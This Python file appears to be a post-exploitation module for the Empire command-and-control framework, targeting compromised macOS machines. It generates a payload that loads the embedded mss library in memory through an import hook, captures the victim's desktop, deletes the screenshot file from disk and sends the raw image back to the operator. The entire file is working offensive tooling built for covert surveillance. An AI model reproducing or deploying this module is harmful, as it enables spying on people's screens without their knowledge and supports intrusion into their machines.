import base64
import os
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'NativeScreenshotMSS',
            'Author': ['@xorrior'],
            'Description': ('Takes a screenshot of an OSX desktop using the Python mss module. The python-mss module utilizes ctypes and the CoreFoundation library.'),
            'Background': False,
            'OutputExtension': "png",
            'NeedsAdmin': False,
            'OpsecSafe': False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': []
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SavePath': {
                'Description'   :   'Monitor to obtain a screenshot. 0 represents all.',
                'Required'      :   True,
                'Value'         :   '/tmp/debug.png'
            },
            'Monitor': {
                'Description'   :   'Monitor to obtain a screenshot. -1 represents all.',
                'Required'      :   True,
                'Value'         :   '-1'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        path = self.mainMenu.installPath + "data/misc/python_modules/mss.zip"
        filename = os.path.basename(path).rstrip('.zip')
        open_file = open(path, 'rb')
        module_data = open_file.read()
        open_file.close()
        module_data = base64.b64encode(module_data)
        script = """
import os
import base64
data = "%s"
def run(data):
    rawmodule = base64.b64decode(data)
    zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
    if "mss" not in moduleRepo.keys():
        moduleRepo["mss"] = zf
        install_hook("mss")
    from mss import mss
    m = mss()
    file = m.shot(mon=%s,output='%s')
    raw = open(file, 'rb').read()
    run_command('rm -f %%s' %% (file))
    print raw
run(data)
""" % (module_data, self.options['Monitor']['Value'], self.options['SavePath']['Value'])
        return script